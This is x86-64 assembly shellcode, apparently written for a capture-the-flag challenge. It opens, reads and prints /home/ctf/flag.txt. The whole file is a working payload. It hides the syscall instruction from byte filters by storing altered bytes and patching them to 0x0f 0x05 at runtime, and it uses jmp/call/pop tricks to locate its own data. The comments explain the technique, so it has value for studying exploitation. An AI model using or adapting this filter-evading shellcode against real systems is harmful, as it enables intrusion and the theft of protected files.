bits 64

; Jump down to the bottom, where we have the bytes for syscall (less 1) waiting
jmp short my_fake_syscall_bottom
  my_fake_syscall_top:
  pop rbx ; Pop the address of the syscall-minus-1 block into rbx
  add word [rbx], 0x0101 ; Increment the two bytes - 0x0e -> 0x0f and 0x04 -> 0x05

  ; Now rbx points to "syscall / ret", so we can just call that any time we
  ; need a syscall!
  ;
  ; Other than changing "syscall" to "call rbx", the rest is identical!

;;; OPEN

  ; Syscall 2 = sys_open
  xor rax, rax
  mov al, 2

  ; rdi = filename
  jmp short getfilename_bottom
getfilename_top:
  pop rdi ; Pop the top of the stack (which is the filename) into rdi

  ; rsi = flags
  xor rsi, rsi

  ; rdx = mode
  xor rdx, rdx

  ; Perform sys_open() syscall, the file handle is returned in rax
  call rbx

;;; READ

  push rdi ; Temporarly store the filename pointer
  push rax ; Temporarily store the handle

  ; Syscall 0 = sys_read
  xor rax, rax

  ; rdi = file handle
  pop rdi

  ; rsi = buffer (same as filename)
  pop rsi

  ; rdx = count
  xor rdx, rdx
  mov dl, 30

  ; Perform sys_read() syscall, reading from the opened file
  call rbx

;;; WRITE

  ; Syscall 1 = sys_write
  xor rax, rax
  inc rax

  ; File handle to write to = stdout = 1
  xor rdi, rdi
  inc rdi

  ; (rsi is already the buffer)

  ; rdx is the count again
  xor rdx, rdx
  mov dl, 30

  ; Perform the sys_write syscall, writing the data to stdout
  call rbx

;;; EXIT
  ; Syscall 60 = exit
  xor rax, rax
  mov al, 60

  ; Exit with code 0
  xor rdi, rdi

  ; Perform an exit
  call rbx

my_fake_syscall_bottom:
  call my_fake_syscall_top

  ; This little block will become "syscall / ret"
  db 0x0e, 0x04 ; syscall is actually 0x0f 0x05
  ret ; Return after doing a syscall


getfilename_bottom:
  call getfilename_top

  db "/home/ctf/flag.txt" ; The literal flag, fortunately the buffer itself is null-filled so we don't need to null terminate
